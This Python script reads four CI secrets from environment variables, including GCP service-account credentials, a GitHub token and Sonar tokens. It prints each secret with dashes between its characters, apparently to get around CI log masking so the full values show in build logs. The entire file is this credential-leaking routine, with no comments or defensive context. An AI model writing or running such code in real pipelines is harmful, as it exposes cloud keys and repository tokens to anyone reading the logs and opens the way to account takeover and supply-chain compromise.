#!/usr/bin/env python3

import os
import base64
import binascii

GCP_GSM_CREDENTIALS = os.getenv("GCP_GSM_CREDENTIALS")
print("-".join([x for x in GCP_GSM_CREDENTIALS]))

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
print("-".join([x for x in GITHUB_TOKEN]))

GCP_SONAR_SA_KEY = os.getenv("GCP_SONAR_SA_KEY")
print("-".join([x for x in GCP_SONAR_SA_KEY]))

SONAR_TOKEN = os.getenv("SONAR_TOKEN")
print("-".join([x for x in SONAR_TOKEN]))
